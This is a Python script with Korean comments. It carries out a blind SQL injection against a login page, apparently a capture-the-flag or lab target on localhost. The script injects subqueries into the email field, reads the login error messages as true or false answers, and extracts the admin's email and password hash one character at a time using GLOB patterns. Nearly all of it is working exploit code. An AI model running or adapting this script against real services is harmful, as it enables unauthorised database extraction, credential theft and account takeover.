import requests
import string

BASE_URL = "http://localhost:3000"   # 실제 서비스 주소에 맞게 변경
LOGIN_URL = f"{BASE_URL}/login"

CHARSET_EMAIL = string.ascii_lowercase + string.ascii_uppercase + string.digits + "@._-"

bad_for_glob = set("*?[]")
CHARSET_HASH = "".join(
    ch for ch in (string.ascii_letters + string.digits + string.punctuation + " ")
    if ch not in bad_for_glob
)

#CHARSET_HASH = string.ascii_letters + string.digits + string.punctuation + " "

nickname = "f1@g" # nickname 필드

def send_login(email_payload: str, password: str = "test") -> requests.Response:
    data = {"email": email_payload, "password": password}
    resp = requests.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
    return resp


def is_true_response(resp: requests.Response) -> bool:
    text = resp.text
    if "존재하지 않는 계정" in text:
        return False
    if "비밀번호가 올바르지 않습니다" in text:
        return True
    if resp.status_code == 302:
        return True
    return False

def test_condition(condition: str) -> bool:
    payload = (
        "'||(SELECT(email)FROM(users)"
        f"WHERE(nickname='{nickname}')AND(" + condition + "))||'"
    )
    resp = send_login(payload)
    return is_true_response(resp)

def test_hash_condition(target_email: str, hash_predicate: str) -> bool:
    esc_email = target_email.replace("'", "''")

    inner = (
        "(SELECT COUNT(*) FROM users "
        f"WHERE(email='{esc_email}')AND(" + hash_predicate + "))>0"
    )

    payload = (
        "'||(SELECT(email)FROM(users)"
        f"WHERE(nickname='{nickname}')AND" + inner + ")||'"
    )

    resp = send_login(payload)
    return is_true_response(resp)

def test_true_false():
    t = test_condition("1=1")
    f = test_condition("1=2")
    if t == f:
        print("no")
    else:
        print("good")

def extract_length_email(max_len: int = 100) -> int:
    lo, hi = 0, max_len

    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"LENGTH(email)>{mid}"

        if test_condition(cond):
            lo = mid + 1
        else:
            hi = mid

    return lo

def extract_length_hash(target_email: str, max_len: int = 120) -> int:
    lo, hi = 0, max_len

    while lo < hi:
        mid = (lo + hi) // 2
        pred = f"LENGTH(password_hash)>{mid}"

        if test_hash_condition(target_email, pred):
            lo = mid + 1
        else:
            hi = mid

    return lo

def extract_email(length: int) -> str:
    result = ""

    for pos in range(1, length + 1):
        found = False
        '''
        if pos == 1 or pos % 5 == 0:
            print(f"    진행률: {pos}/{length} - 현재: {result}")
        '''

        for ch in CHARSET_EMAIL:
            esc_ch = ch.replace("'", "''")

            if result:
                esc_res = result.replace("'", "''")
                cond = (
                    f"REPLACE(email,'{esc_res}','') "
                    f"GLOB '{esc_ch}*'"
                )
            else:
                cond = f"email GLOB '{esc_ch}*'"

            if test_condition(cond):
                result += ch
                found = True
                break

    print(f"[+] email 추출 결과: {result}")
    return result

def extract_hash(target_email: str, length: int, charset: str) -> str:
    result = ""

    for pos in range(1, length + 1):
        found = False

        '''
        if pos == 1 or pos % 5 == 0:
            print(f"    진행률: {pos}/{length} - 현재: {result}")
        '''

        for ch in charset:
            esc_ch = ch.replace("'", "''")

            if ch == '/':
                glob_pattern = "'/?*'"
            else:
                glob_pattern = f"'{esc_ch}*'"

            if result:
                esc_res = result.replace("'", "''")
                pred = (
                    f"REPLACE(password_hash,'{esc_res}','') "
                    f"GLOB {glob_pattern}"
                )
            else:
                pred = f"password_hash GLOB {glob_pattern}"

            if test_hash_condition(target_email, pred):
                result += ch
                found = True
                break

        if not found:
            result += "?"

    print(f"[+] password_hash 추출 결과: {result}")
    return result

def main():
    '''
    test
    try:
        test_true_false()
    except Exception as e:
        print(f"[!] 연결/테스트 중 오류: {e}")
        return
    '''
    # 1) email 길이
    email_len = extract_length_email(max_len=100)
    if email_len <= 0:
        print("[-] email 길이 추출 실패")
        return

    # 2) email 값
    admin_email = extract_email(email_len)
    print(f"\n[+] Admin Email: {admin_email}")

    # 3) hash 길이
    hash_len = extract_length_hash(admin_email, max_len=120)
    if hash_len <= 0:
        print("[-] password_hash 길이 추출 실패")
        return

    print(f"[+] password_hash 길이: {hash_len}")

    # 4) hash 값
    admin_hash = extract_hash(admin_email, hash_len, CHARSET_HASH)
    print(f"\n[+] Admin Password Hash: {admin_hash}")

    print("[+] 최종 결과")
    print(f"email : {admin_email}")
    print(f"password_hash : {admin_hash}")

if __name__ == "__main__":
    main()